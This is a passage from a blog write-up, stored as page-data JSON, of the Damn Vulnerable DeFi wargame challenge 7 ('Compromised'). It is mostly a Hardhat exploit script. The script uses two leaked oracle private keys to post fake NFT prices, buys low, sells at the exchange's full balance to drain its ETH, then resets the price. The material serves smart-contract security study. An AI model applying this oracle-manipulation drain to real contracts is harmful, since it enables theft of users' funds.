         <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">oracle</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Deploy the exchange and get the associated ERC721 token</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ExchangeFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token punctuation\">{</span> value<span class=\"token operator\">:</span> <span class=\"token constant\">EXCHANGE_INITIAL_ETH_BALANCE</span> <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>nftToken <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> DamnValuableNFTFactory<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span><span class=\"token function\">token</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>        \n        <span class=\"token comment\">/** CODE YOUR EXPLOIT HERE */</span>\n        <span class=\"token keyword\">const</span> keys <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n            <span class=\"token string\">'0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9'</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">'0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'</span>\n        <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">var</span> walletList <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>    \n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> keys<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            walletList<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">ethers</span><span class=\"token punctuation\">.</span><span class=\"token function\">Wallet</span><span class=\"token punctuation\">(</span>keys<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token comment\">// update NFT Pirce 0</span>\n        <span class=\"token keyword\">var</span> txList <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> walletList<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            txList<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>walletList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        \n        <span class=\"token comment\">// buy</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">buyOne</span><span class=\"token punctuation\">(</span>\n            <span class=\"token punctuation\">{</span>\n                value<span class=\"token operator\">:</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0.001\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// exchnage pill</span>\n        <span class=\"token keyword\">const</span> sellAmt <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> walletList<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>walletList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> sellAmt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token comment\">// approve exchange nft</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>nftToken<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sellOne</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// update price nft</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> walletList<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>walletList<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">postPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">INITIAL_NFT_PRICE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SUCCESS CONDITIONS */</span>\n        \n        <span class=\"token comment\">// Exchange must have lost all ETH</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>exchange<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">// Attacker's ETH balance must have significantly increased</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">getBalance</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">gt</span><span class=\"token punctuation\">(</span><span class=\"token constant\">EXCHANGE_INITIAL_ETH_BALANCE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">// Attacker must not own any NFT</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>nftToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// NFT price shouldn't have changed</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>oracle<span class=\"token punctuation\">.</span><span class=\"token function\">getMedianPrice</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"DVNFT\"</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token constant\">INITIAL_NFT_PRICE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. 🚀</h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>","frontmatter":{"date":"August 02, 2022","title":"Damn Vulnerable DeFi Wargame Challenge7 — Compromised Contract Analysis 😶‍🌫️","categories":"Blockchain","author":"Zer0Luck","emoji":"🦊"},"fields":{"slug":"/defi-wargame-7/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/defi-wargame-6/","nextSlug":"/solana-chain-Program-Web3-API/","prevSlug":"/defi-wargame-7/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}